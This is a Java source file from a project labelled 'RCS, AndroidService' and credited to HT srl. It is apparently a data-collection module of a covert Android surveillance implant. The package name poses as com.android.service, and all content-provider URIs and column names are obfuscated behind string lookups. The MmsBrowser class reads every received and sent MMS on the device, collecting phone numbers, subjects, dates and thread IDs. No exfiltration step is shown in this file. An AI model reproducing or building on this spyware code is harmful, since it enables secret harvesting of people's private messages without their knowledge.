/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : MmsBrowser.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module.sms;

import java.util.ArrayList;

import android.database.Cursor;
import android.net.Uri;

import com.android.service.Messages;
import com.android.service.Mms;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public class MmsBrowser {
	private static final String TAG = "MmsBrowser"; //$NON-NLS-1$

	private final ArrayList<Mms> list;

	public MmsBrowser() {
		list = new ArrayList<Mms>();
	}

	public ArrayList<Mms> getMmsList() {
		list.clear();

		parse(Messages.getString("13.1"), Mms.RECEIVED); //$NON-NLS-1$
		parse(Messages.getString("13.0"), Mms.SENT); //$NON-NLS-1$

		return list;
	}

	private void parse(String content, boolean sentState) {
		final String[] projection = new String[] {
				Messages.getString("13.2"), Messages.getString("13.3"), Messages.getString("13.4"), Messages.getString("13.5") }; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
		final String selection = Messages.getString("13.5") + Messages.getString("13.6"); //$NON-NLS-1$

		final Cursor c = Status.getAppContext().getContentResolver().query(Uri.parse(content), null, null, null, null);

		final int mmsEntriesCount = c.getCount();

		if (c.moveToFirst() == false) {
			c.close();
			return;
		}

		for (int i = 0; i < mmsEntriesCount; i++) {
			String subject, number;
			long date;
			boolean sentStatus;

			for (int j = 0; j < c.getColumnCount(); j++) {
				final String name = c.getColumnName(j);
				final String value = c.getString(c.getColumnIndex(name));
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + name + " = " + value);//$NON-NLS-1$ //$NON-NLS-2$
				}
			}

			// These fields are needed
			try {
				subject = c.getString(c.getColumnIndex(Messages.getString("13.8"))); //$NON-NLS-1$
				date = Long.parseLong(c.getString(c.getColumnIndex(Messages.getString("13.9"))).toString()); //$NON-NLS-1$
				final String id = c.getString(c.getColumnIndex(Messages.getString("13.10"))); //$NON-NLS-1$

				final Uri.Builder builder = Uri.parse(Messages.getString("13.11")).buildUpon(); //$NON-NLS-1$
				builder.appendPath(String.valueOf(id)).appendPath(Messages.getString("13.12")); //$NON-NLS-1$

				final Cursor cursor = Status.getAppContext().getContentResolver()
						.query(builder.build(), projection, selection, null, null);

				if (cursor.moveToFirst() == true) {
					number = cursor.getString(0);
					if (Messages.getString("13.13").equals(number)) { //$NON-NLS-1$
						number = ""; //$NON-NLS-1$
					}
				} else {
					number = ""; //$NON-NLS-1$
				}

				cursor.close();

				sentStatus = sentState;
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
				c.close();
				return;
			}

			final Mms m = new Mms(number, subject, date, sentStatus);

			try {
				final int id = Integer.parseInt(c.getString(c.getColumnIndex(Messages.getString("13.16"))).toString()); //$NON-NLS-1$
				m.setId(id);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
			}

			try {
				final int thread_id = Integer.parseInt(c
						.getString(c.getColumnIndex(Messages.getString("13.17"))).toString()); //$NON-NLS-1$
				m.setThreadId(thread_id);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
			}

			c.moveToNext();
			list.add(m);
		}
	}
}
